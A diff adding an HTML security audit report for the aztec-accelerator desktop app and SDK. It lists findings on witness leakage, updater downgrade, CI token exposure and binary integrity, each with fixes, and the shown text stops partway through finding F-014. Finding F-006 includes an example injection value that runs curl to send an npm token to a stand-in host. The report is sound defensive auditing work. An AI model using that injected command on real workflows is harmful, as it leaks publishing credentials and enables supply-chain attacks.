@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Harden Report — security — aztec-accelerator</title>
+<style>
+  :root {
+    --bg: #ffffff; --fg: #1a1a1a; --muted: #6b6b6b; --hairline: #e3e3e3;
+    --surface: #fafafa; --code: #f0f0f0; --link: #0b62c4;
+    --high: #b3261e; --high-bg: #fdeceb; --med: #9a6700; --med-bg: #fff4d6;
+    --low: #57606a; --low-bg: #eef1f4; --green: #1a7f37; --green-bg: #e6f4ea;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121212; --fg: #e6e6e6; --muted: #9a9a9a; --hairline: #2c2c2c;
+      --surface: #1b1b1b; --code: #242424; --link: #6cb2ff;
+      --high: #ff7b72; --high-bg: #3a1d1b; --med: #e3b341; --med-bg: #3a2f12;
+      --low: #a0a8b0; --low-bg: #23272c; --green: #57c478; --green-bg: #15301d;
+    }
+  }
+  body { background: var(--bg); color: var(--fg); margin: 0 auto; max-width: 820px;
+         padding: 2.5rem 1.25rem 4rem; font: 16px/1.6 -apple-system, BlinkMacSystemFont,
+         "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+  h1 { font-size: 1.6rem; } h2 { font-size: 1.25rem; margin-top: 2.5rem; }
+  h3 { font-size: 1.05rem; }
+  a { color: var(--link); }
+  code { background: var(--code); border-radius: 4px; padding: 0.1em 0.35em; font-size: 0.88em;
+         overflow-wrap: anywhere; }
+  .muted { color: var(--muted); }
+  .stats { display: flex; gap: 0.5rem; flex-wrap: wrap; margin: 1.25rem 0 2rem; }
+  .chip { border-radius: 999px; padding: 0.15em 0.7em; font-size: 0.8rem; font-weight: 600;
+          background: var(--low-bg); color: var(--low); }
+  .chip-high { background: var(--high-bg); color: var(--high); }
+  .chip-med  { background: var(--med-bg);  color: var(--med); }
+  .chip-low  { background: var(--low-bg);  color: var(--low); }
+  .chip-info { background: var(--low-bg);  color: var(--low); font-weight: 500; }
+  .callout { border: 1px solid var(--hairline); border-left: 4px solid var(--green);
+             background: var(--green-bg); border-radius: 8px; padding: 0.9rem 1.1rem; margin: 1.25rem 0; }
+  .callout-pair { border-left-color: var(--med); background: var(--med-bg); }
+  .finding { background: var(--surface); border: 1px solid var(--hairline); border-radius: 8px;
+             padding: 1.2rem; margin: 1.25rem 0; }
+  .finding-header { display: flex; gap: 0.6rem; align-items: baseline; flex-wrap: wrap; }
+  .finding-id { color: var(--muted); font-weight: 600; }
+  .finding-title { font-weight: 700; }
+  .meta-line { margin: 0.6rem 0 0.9rem; display: flex; gap: 0.35rem; flex-wrap: wrap; }
+  .eli5 p { margin: 0.5rem 0; }
+  details { margin-top: 0.75rem; }
+  summary { cursor: pointer; color: var(--link); }
+  .trace { overflow-x: auto; }
+  footer { margin-top: 3rem; border-top: 1px solid var(--hairline); padding-top: 1rem;
+           font-size: 0.85rem; color: var(--muted); }
+</style>
+</head>
+<body>
+
+<h1>Harden Report: security</h1>
+<p class="muted">aztec-accelerator · 2026-07-09 · effort: high · run 2026-07-09-5c788c0 (<code>5c788c0</code>)<br>
+Emphasis: privacy leaks · cryptography · ZK witness risk. Scope: whole repo minus playground &amp; landing.</p>
+
+<div class="stats">
+  <span class="chip">16 findings</span>
+  <span class="chip chip-high">0 Critical</span>
+  <span class="chip chip-high">2 High</span>
+  <span class="chip chip-med">7 Medium</span>
+  <span class="chip chip-low">7 Low</span>
+</div>
+
+<h2>Executive summary</h2>
+<p>Ten areas of the codebase were each audited twice — once by a Claude agent and once by a Codex agent, 20 independent passes — with extra weight on the three things you asked about: privacy leaks, cryptography, and the <em>witness</em> (the secret inputs to a zero-knowledge proof, which if leaked would deanonymize an otherwise-private transaction). The headline is that this is a <strong>well-built application</strong>: the anti-DNS-rebinding guard, the deny-by-default site-approval model, the one-time approval tokens, and the fail-closed binary-download checks in the running app all survived direct attack. Most areas produced only one or two findings; several produced none. There are <strong>no Critical issues</strong> — nothing here lets a random website on the internet attack a user with no local foothold.</p>
+<p>The real findings gather around two stories. The first is <strong>trust between the browser SDK and the local app</strong>: the SDK will hand the secret witness to <em>whatever program answers</em> on the expected local port, without ever checking it is the genuine accelerator (F-001) — and a second bug lets a hostile local program push the real app out and take that port (F-002). A third, simpler witness bug: the app writes the witness to a temporary file that other users on the same machine can read while a proof runs (F-003). The second story is the <strong>update and release pipeline</strong>: the auto-updater can be tricked into installing an <em>older, still-validly-signed</em> version that has known bugs (F-004); the cloud role that publishes releases can rewrite the update feed from unprotected branches (F-005); a publish workflow can be made to leak its npm token (F-006); and the <code>bb</code> proving binary has two integrity gaps in its setup scripts (F-007, F-008).</p>
+<p>Priorities: fix the SDK↔app identity pair (F-001 + F-002) and the update pair (F-004 + F-005) as design work, and land the three cheap, certain fixes (F-003, F-006, F-009) immediately. Every High finding requires either a program already running on the user's machine or control of the project's CI/update infrastructure — important context for how urgently to treat them.</p>
+
+<div class="callout">
+  <strong>Cheapest fixes first (land these in the first PR).</strong>
+  <strong>F-003</strong> — add one line so the witness temp file/dir is owner-only (<code>0o600</code>/<code>0o700</code>); the app already does exactly this for its config and cert files.
+  <strong>F-006</strong> — pass the workflow's <code>dist_tag</code> input through <code>env:</code> and quote it, instead of pasting it straight into a shell command.
+  <strong>F-009</strong> — take the "one proof at a time" lock <em>before</em> reading the 50&nbsp;MB request body, not after.
+</div>
+
+<div class="callout callout-pair">
+  <strong>Ship together.</strong>
+  <strong>F-001 + F-002</strong> are the same missing idea — neither the SDK nor the app authenticates the other end on the local port; fixing one without the other still leaves a program able to receive the witness.
+  <strong>F-004 + F-005</strong> compound — F-005 is the concrete way an attacker reaches the update feed that F-004 then abuses to force a downgrade; patch the feed's write-access and the version-binding in the same effort.
+  <strong>F-007 + F-008</strong> are both <code>bb</code>-binary integrity gaps in the download/pin tooling — fix them as one supply-chain pass.
+</div>
+
+<h2>Findings</h2>
+
+<!-- F-001 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-high">High</span>
+    <span class="finding-id">F-001</span>
+    <span class="finding-title">SDK sends the private witness to an unauthenticated local server</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-306</span>
+    <span class="chip chip-info">fix: days</span>
+    <span class="chip chip-info">couples with F-002</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> To speed up proofs, the browser SDK looks for the accelerator app on a fixed local address and, if something answers a simple health check, sends it the <em>witness</em> — the private inputs to the proof. The SDK never confirms that the thing answering is actually the real accelerator. Any reply counts, even an empty one, and even a version it doesn't recognize still gets the witness.</p>
+    <p><strong>What an attacker would do.</strong> Run a small program on the victim's machine that grabs the expected local port before the real app does and answers the health check. The next time the user's dApp makes a proof, the SDK sends the private witness to the attacker's program, which quietly keeps a copy. That copy is enough to deanonymize a transaction that was supposed to be private.</p>
+    <p><strong>The fix.</strong> Have the SDK prove it is talking to the genuine app before sending anything sensitive — pin the app's certificate/public key, or share a small secret token through the app's owner-only data folder that the SDK checks. And if the health response is unrecognized or an old version, fall back to local proving instead of sending the witness.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/sdk/src/lib/accelerator-transport.ts:112,116,148</code>; <code>packages/sdk/src/lib/accelerator-prover.ts:177,194,262,273,299,309</code></p>
+    <p><strong>Trace:</strong> <code>createChonkProof()</code> (prover:262) → status check (:273) → unauthenticated <code>GET /health</code> (transport:112), first-win <code>Promise.any</code> (:116) pins protocol (prover:194); a bare <code>{}</code> body reaches the legacy "available" path (prover:177). Witness serialized (prover:299) → <code>POST {baseUrl}/prove</code> (transport:148). No cert-pin / shared-secret / attestation anywhere.</p>
+    <p><strong>Fix:</strong> mutual identity via pinned self-signed cert or per-install token from the app's <code>0o700</code> data dir; treat unrecognized/legacy <code>/health</code> as not-available (WASM fallback).</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-004 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-high">High</span>
+    <span class="finding-id">F-004</span>
+    <span class="finding-title">Auto-updater can be forced to install an older, signed-but-vulnerable build</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-347</span>
+    <span class="chip chip-info">fix: days</span>
+    <span class="chip chip-info">couples with F-005</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> The updater cryptographically checks that an update file is genuinely signed by the project — that part is solid. But the "is this newer than what I have?" decision reads a <em>version number</em> from the update feed that is not tied to the signed file. So the feed can claim a huge version number while handing over an old file that is still validly signed.</p>
+    <p><strong>What an attacker would do.</strong> Whoever can edit the update feed (see F-005 for how) advertises <code>version 999.0.0</code> but points the download at a genuine older release that has since-fixed security bugs. The signature checks out, the version looks newer, and the app downgrades itself — silently, for users with auto-update on — reopening whatever those old bugs were.</p>
+    <p><strong>The fix.</strong> After downloading, check that the file's own embedded version matches the feed's claimed version <em>and</em> is strictly newer than what's installed; remember the highest version ever installed and refuse to go below it. Fix the feed's access control at the same time (F-005).</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/src-tauri/src/updater.rs:27,39-56,126-137,170</code></p>
+    <p><strong>Trace:</strong> feed <code>update.version</code> drives the newer-check (updater.rs:39-41) but is never compared to the downloaded artifact; <code>update.install(bytes)</code> (:170) accepts any validly-signed (possibly older) build. minisign authenticates bytes, not version→artifact binding. No monotonic floor.</p>
+    <p><strong>Fix:</strong> post-download assert embedded-version == feed-version &amp;&amp; &gt; installed; persist a rollback floor. Platform installers (MSI) may add their own downgrade guard — don't rely on it cross-platform.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-002 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-002</span>
+    <span class="finding-title">A fake local server can evict the real accelerator and keep its port (Windows)</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-287</span>
+    <span class="chip chip-info">fix: hours–days</span>
+    <span class="chip chip-info">couples with F-001</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> When the accelerator starts and finds the port already taken, it pings the health endpoint to decide "is that just another copy of me?" — and if the answer looks like a healthy accelerator, it quietly exits. But that health answer is public and trivial to fake.</p>
+    <p><strong>What an attacker would do.</strong> Start a hostile program first, bind the port, and answer the health check like a real accelerator. On Windows, the genuine app then decides it's redundant and exits — handing the port to the attacker, who now receives the witnesses that F-001's SDK will send. It turns "you need to already be running" into "just start first."</p>
+    <p><strong>The fix.</strong> Before self-terminating, confirm the existing listener is really the accelerator — e.g. a per-install secret, a named-pipe/OS identity check, or a signed challenge — not just a public JSON shape anyone can echo.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/core/src/server/probe.rs:14-17,24-44</code>; <code>packages/accelerator/src-tauri/src/main.rs:238-245</code></p>
+    <p><strong>Trace:</strong> probe accepts any 2xx with <code>status=="ok"</code> &amp; <code>api_version==1</code> (probe.rs:14-17) → positive probe → <code>exit(0)</code> (main.rs:238-245). Impostor keeps the port.</p>
+    <p><strong>Fix:</strong> authenticate the incumbent (shared secret / IPC identity / signed challenge) before exiting.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-003 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-003</span>
+    <span class="finding-title">Private witness written to a world-readable temp file during proving</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude (verified)</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-200 / CWE-732</span>
+    <span class="chip chip-info">fix: hours · CHEAPEST</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> To run a proof, the app writes the witness to a temporary file and points the <code>bb</code> proving tool at it. That file — and its folder — are created with default permissions, which on a typical Linux machine means <em>any</em> user on the system can read them. (We confirmed this by reading the actual <code>tempfile</code> library source: its temp-directory helper does not lock down permissions unless you explicitly ask it to.)</p>
+    <p><strong>What an attacker would do.</strong> On a shared machine — a dev server, a CI runner, or a homelab running many processes — a second local user watches the temp folder and copies the witness file during the few minutes a proof runs. No special privileges needed. The app already gets this right for its config and certificate files (owner-only); this one spot was missed.</p>
+    <p><strong>The fix.</strong> Create the temp directory owner-only and write the file <code>0o600</code> — mirror the <code>0o700</code>/<code>0o600</code> pattern already used in <code>config.rs</code> and <code>certs.rs</code>. One or two lines.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/core/src/bb.rs:86-90</code></p>
+    <p><strong>Trace:</strong> <code>tempfile::tempdir()</code> (bb.rs:86) → verified against tempfile 3.27.0 <code>src/dir/imp/unix.rs::create</code>: dir mode is set only if the caller passes <code>permissions</code>; <code>tempdir()</code> passes <code>None</code> → umask-default (~<code>0o755</code>). <code>std::fs::write(&amp;input_path, ivc_inputs)</code> (bb.rs:90) → file ~<code>0o644</code>. Readable by other local users for ≤5 min. Neutralized only by a hardened umask (077).</p>
+    <p><strong>Fix:</strong> <code>tempfile::Builder::new().permissions(Permissions::from_mode(0o700)).tempdir()</code> and write the file <code>0o600</code>.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-005 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-005</span>
+    <span class="finding-title">Release role can rewrite the update feed &amp; site from unprotected branches</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-269</span>
+    <span class="chip chip-info">fix: hours–days</span>
+    <span class="chip chip-info">couples with F-004</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> The cloud (AWS) role that CI uses to publish releases trusts GitHub identities from branch-name <em>patterns</em> (<code>chore/aztec-stable-*</code>, <code>chore/aztec-nightlies-*</code>) and the <code>nightlies</code> branch — but branch-protection rules only cover <code>main</code>. That role can write to the <em>entire</em> hosting bucket, including <code>releases/latest.json</code>, the file the auto-updater trusts.</p>
+    <p><strong>What an attacker would do.</strong> Anyone who can push one of those unprotected branches and run a workflow (in this solo repo: the owner, or a stolen owner/CI token — not an anonymous outsider) obtains the deploy credentials and rewrites the update feed (enabling the F-004 downgrade) or defaces the landing/playground pages. The release signature still blocks shipping brand-new malware, but not downgrade, denial-of-service, or phishing.</p>
+    <p><strong>The fix.</strong> Restrict the cloud trust to protected refs only; protect the <code>nightlies</code> and <code>chore/aztec-*</code> branches; give each pipeline write access only to its own folder in the bucket (releases vs landing vs playground); require at least one review on <code>main</code>.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>infra/tofu/iam.tf:32-38,53-72</code>; <code>infra/rulesets/main-branch-protection.json:6-20</code>; <code>.github/workflows/publish-nightlies.yml:69-82</code>; <code>.github/workflows/release-accelerator.yml:809-824</code></p>
+    <p><strong>Trace:</strong> OIDC <code>sub</code> StringLike <code>chore/aztec-*-*</code> (iam.tf:32-38); protection covers only <code>main</code> (0 approvals); role gets bucket-wide <code>PutObject/DeleteObject</code> + CloudFront invalidation (iam.tf:53-72), writing <code>landing/releases/latest.json</code> (release-accelerator.yml:815).</p>
+    <p><strong>Fix:</strong> scope <code>sub</code> to protected refs; protect the wildcard/nightlies branches; per-prefix S3 policy; ≥1 review on main.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-006 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-006</span>
+    <span class="finding-title">Publish workflow input is pasted into a shell command with tokens present</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Codex (verified)</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-78</span>
+    <span class="chip chip-info">fix: hours · CHEAPEST</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> The reusable "Publish SDK" workflow takes a text input (<code>dist_tag</code>) and drops it, unquoted, directly into shell commands that run with the npm publish token and a GitHub token in the environment.</p>
+    <p><strong>What an attacker would do.</strong> Someone able to run that workflow by hand (a collaborator, or a stolen token) sets <code>dist_tag</code> to something like <code>x; curl -d "$NODE_AUTH_TOKEN" https://evil</code>. GitHub pastes it into the command before the shell runs, so the injected part executes and exfiltrates the npm token — enough to publish a malicious version of the package to every consumer.</p>
+    <p><strong>The fix.</strong> Pass the input through an <code>env:</code> variable and reference it quoted (<code>"$DIST_TAG"</code>), and validate it against a strict allowlist like <code>^[a-z0-9._-]+$</code>.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>.github/workflows/_publish-sdk.yml:101,108,124,126</code></p>
+    <p><strong>Trace:</strong> line 101 <code>npm publish … --tag ${{ inputs.dist_tag }}</code> (unquoted, <code>NODE_AUTH_TOKEN</code> in env); line 124 same expression inside a double-quoted <code>NOTES=</code> in a step with <code>GH_TOKEN</code>. GitHub expands <code>${{ }}</code> before bash runs → command/substitution injection.</p>
+    <p><strong>Fix:</strong> <code>env: DIST_TAG: ${{ inputs.dist_tag }}</code> then <code>"$DIST_TAG"</code>; validate format.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-007 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-007</span>
+    <span class="finding-title">A helper script fills the trusted bb cache with no integrity check</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-494</span>
+    <span class="chip chip-info">fix: hours</span>
+    <span class="chip chip-info">couples with F-008</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> The running app downloads the <code>bb</code> proving binary carefully — it checks a SHA-256 digest and refuses anything that doesn't match. But a separate developer script, <code>bb:download</code>, downloads the same binary into the <em>same</em> cache folder with <em>no</em> check at all. And the app, when it sees a binary already in the cache, trusts it and runs it without re-checking.</p>
+    <p><strong>What an attacker would do.</strong> Tamper with the download (a compromised release, or a network man-in-the-middle) while someone runs <code>bun run bb:download</code>. The bad binary lands in the trusted cache; later, when a proof runs, the app executes it and it reads/exfiltrates the witness it was handed.</p>
+    <p><strong>The fix.</strong> Give the script the same fail-closed SHA-256 check the Rust runtime already uses — or have the runtime verify a recorded digest on every cache hit instead of trusting that a file merely exists.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>scripts/download-bb.ts:32-106</code>; <code>packages/accelerator/core/src/versions/cache_layout.rs:7-30</code>; <code>packages/accelerator/core/src/server/prove.rs:75</code>; <code>packages/accelerator/core/src/bb.rs:31-35</code></p>
+    <p><strong>Trace:</strong> <code>download-bb.ts</code> fetch + <code>tar -xzf</code> with no digest → <code>~/.aztec-accelerator/versions/{version}/bb</code> (same layout as cache_layout.rs); runtime cache-hit short-circuit (prove.rs:75 / find_bb) executes it without <code>verify_digest</code>.</p>
+    <p><strong>Fix:</strong> mirror the Rust fail-closed SHA-256 check in the script, or verify a persisted digest marker on cache hit.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-008 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-008</span>
+    <span class="finding-title">Windows bb.exe checksum is auto-pinned from whatever the download returns</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-494</span>
+    <span class="chip chip-info">fix: hours–days</span>
+    <span class="chip chip-info">couples with F-007</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> For the Windows build, the code "pins" the expected checksum of <code>bb.exe</code> — but the pin is generated automatically by hashing whatever the release URL returned at update time, and it merges with zero required reviews. So the checksum guarantees only "matches the first thing we downloaded," not "matches a known-good binary."</p>
+    <p><strong>What an attacker would do.</strong> Compromise the upstream Windows asset at the moment a maintainer runs the version-update script. The script hashes the malicious file and writes that hash in as the trusted pin; later builds "verify" against it and pass, shipping the malicious <code>bb.exe</code> — which processes witnesses — to every Windows user of that release.</p>
+    <p><strong>The fix.</strong> Derive the checksum from an independent source (upstream signed checksums, a second mirror, or a reproducible build) and require a human to review checksum changes.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>scripts/update-aztec-version.ts:79-93,137</code>; <code>packages/accelerator/scripts/copy-bb.ts:56-148</code></p>
+    <p><strong>Trace:</strong> <code>update-aztec-version.ts</code> hashes the fetched tarball and writes it into <code>WINDOWS_BB_CHECKSUMS</code>; <code>copy-bb.ts</code> later verifies against that self-derived pin. 0 required reviews → auto-pin merges unreviewed. The "review-gated pin" comment is contradicted by live branch protection.</p>
+    <p><strong>Fix:</strong> independent checksum source + mandatory human review of pin diffs.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-009 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-med">Medium</span>
+    <span class="finding-id">F-009</span>
+    <span class="finding-title">/prove buffers the whole 50 MB body before the concurrency limit (memory DoS)</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Codex (verified)</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-770</span>
+    <span class="chip chip-info">fix: hours · CHEAPEST</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> The proving endpoint limits itself to one proof at a time. But it reads the entire request body (up to 50&nbsp;MB) into memory <em>before</em> taking that "one at a time" lock, so many requests can pile up, each holding 50&nbsp;MB, all waiting for the single slot.</p>
+    <p><strong>What a user/attacker would trigger.</strong> An already-approved (or local) dApp fires hundreds of concurrent 50&nbsp;MB requests. Each is accepted, buffered, and queued — consuming gigabytes of memory before any proof even starts — until the app or desktop session becomes unstable or crashes.</p>
+    <p><strong>The fix.</strong> Take the concurrency permit (or a bounded memory budget / connection cap) <em>before</em> reading the body, or stream the body to the temp file only once the permit is held.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/core/src/server/prove.rs:110,112,121</code></p>
+    <p><strong>Trace:</strong> authorize (:110) → <code>to_bytes(raw_body, 50MB)</code> (:112) → <code>prove_semaphore.acquire()</code> (:121). Buffer precedes the gate; N concurrent requests hold N×50 MB.</p>
+    <p><strong>Fix:</strong> acquire the permit / memory budget before buffering; or stream under the permit.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-010 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-010</span>
+    <span class="finding-title">Linux crash-recovery writes an unescaped exe path into a systemd unit</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude+Codex</span>
+    <span class="chip chip-info">confidence: moderate</span>
+    <span class="chip chip-info">CWE-74</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> When enabling autostart on Linux, the app writes its own program path into a systemd service file without escaping it. The Windows equivalent already escapes its path; Linux doesn't.</p>
+    <p><strong>What an attacker would do.</strong> If they can get the app to run from a path containing quotes or newlines, they can inject extra service directives that systemd will execute at the user's privilege on next start. The precondition (running from an attacker-named path) is unusual for a normally-installed app, so impact is low.</p>
+    <p><strong>The fix.</strong> Reject control characters in the path, or apply proper systemd escaping — mirror what the Windows path already does.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/src-tauri/src/crash_recovery.rs:134-184</code></p>
+    <p><strong>Trace:</strong> <code>ExecStart="{current_exe()}"</code> written with no escaping (crash_recovery.rs:156-170); Windows sibling XML-escapes (:351-399).</p>
+    <p><strong>Fix:</strong> validate/escape the path before templating.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-011 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-011</span>
+    <span class="finding-title">Trailing-dot origins collapse into an already-approved origin</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Codex (verified)</span>
+    <span class="chip chip-info">confidence: high (code) / low (exploit)</span>
+    <span class="chip chip-info">CWE-863</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> When normalizing a website's origin, the code strips a trailing dot from the hostname, so <code>https://site.example.</code> is treated as the already-approved <code>https://site.example</code>. Browsers consider those two <em>different</em> origins.</p>
+    <p><strong>What an attacker would do.</strong> Serve a page whose origin is the trailing-dot form of a trusted site and skip the approval prompt (and even borrow the "verified" badge). In practice the dotted name almost always resolves to the same real server, so an attacker rarely controls its content — which is why this is low, not medium.</p>
+    <p><strong>The fix.</strong> Reject trailing-dot origins (don't silently strip the dot) so they must be approved on their own.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/core/src/authorization.rs:37</code></p>
+    <p><strong>Trace:</strong> <code>host.trim_end_matches('.')</code> merges <code>https://x.</code> into approved <code>https://x</code> before authz, display, persistence, and verified-site lookup.</p>
+    <p><strong>Fix:</strong> reject trailing-dot hosts in <code>canonicalize_origin</code>.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-012 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-012</span>
+    <span class="finding-title">All IPC commands are globally reachable and no CSP is set (defense-in-depth)</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Codex</span>
+    <span class="chip chip-info">confidence: high (architecture)</span>
+    <span class="chip chip-info">CWE-1021 / CWE-862</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> Every backend command is exposed to every app window, there's no Content-Security-Policy, and the global Tauri bridge is on. Today the app's own pages are safe (they only render text, never raw HTML), so there's no way in — this is a resilience gap, not a live bug.</p>
+    <p><strong>What an attacker would do.</strong> If <em>any</em> future change introduced an HTML-injection bug in an app window, that injected script could call trust-changing commands — approve its own origin, disable auto-updates, remove approved sites — because nothing scopes commands to the window that should use them.</p>
+    <p><strong>The fix.</strong> Set a strict CSP, turn off the global bridge (<code>withGlobalTauri</code>), and scope each command to the window that needs it, so a single injection can't reach the whole command surface.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/src-tauri/src/main.rs:447-460</code>; <code>packages/accelerator/src-tauri/tauri.conf.json</code> (no <code>app.security.csp</code>; <code>withGlobalTauri:true</code>)</p>
+    <p><strong>Trace:</strong> one global <code>invoke_handler</code>; no per-window capability scoping; no CSP. No current injection sink (frontend uses <code>textContent</code>/<code>createElement</code> only).</p>
+    <p><strong>Fix:</strong> strict CSP, drop <code>withGlobalTauri</code>, per-window command scoping.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-013 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-013</span>
+    <span class="finding-title">Headless mode auto-approves every localhost origin regardless of allowlist</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude (verified)</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-863</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> When the headless server runs with an <code>ALLOWED_ORIGINS</code> restriction, it still auto-approves <em>any</em> origin claiming to be localhost (any port). This is documented as intentional (there's no approval popup in headless mode), but it means the operator's allowlist doesn't actually restrict localhost callers.</p>
+    <p><strong>What an attacker would do.</strong> On a shared/CI host, any other local process presents an <code>Origin: http://localhost:NNNN</code> and submits proving jobs, bypassing the allowlist the operator set to lock things down.</p>
+    <p><strong>The fix.</strong> Make localhost auto-approval an explicit opt-in for headless, so an operator who sets an allowlist gets exactly what they asked for.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/server/src/main.rs:78</code></p>
+    <p><strong>Trace:</strong> <code>auto_approve_localhost: true</code> hardcoded in gated mode (documented SEC-04/R13); localhost origins skip the <code>ALLOWED_ORIGINS</code> check.</p>
+    <p><strong>Fix:</strong> gate localhost auto-approve behind an explicit headless flag.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-014 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-014</span>
+    <span class="finding-title">Approve popup overflows on a very long origin; "Remember" is pre-checked</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude (verified, downgraded)</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-451</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
